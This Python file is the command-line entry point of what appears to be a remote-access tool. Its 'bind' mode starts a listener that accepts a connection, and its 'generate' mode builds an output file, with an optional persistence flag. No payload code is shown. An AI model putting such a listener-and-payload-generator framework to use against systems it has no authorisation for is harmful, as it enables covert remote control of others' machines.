import argparse
from common.output import *
from generator.generator import GENERATOR
from server import SERVER
from custom_parser import PARSER


def main():
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument('mode', nargs="?", help="Moder")
    parser.add_argument('-h', '--help', dest="help", default=False, action="store_true", help="Help Manual")
    parser.add_argument('-a', '--address', dest="address", default="", type=str, help="Address to Bind to")
    parser.add_argument('-p', '--port', dest="port", default=0, type=int, help="Port to Bind to")
    parser.add_argument('-o', '--output', dest="output", default="", type=str, help="Complete Path to Output File!")
    parser.add_argument('--persistence', dest="persistence", default=False, action="store_true", help="Persistence")

    parser = parser.parse_args()

    parser = PARSER(parser)

    if parser.mode == "bind":
        server = SERVER(parser)
        server.bind()
        server.accept()
        server.launch()
    elif parser.mode == "generate":
        print_blue("Starting Generator Mode!")
        GENERATOR(parser)


if __name__ == "__main__":
    main()
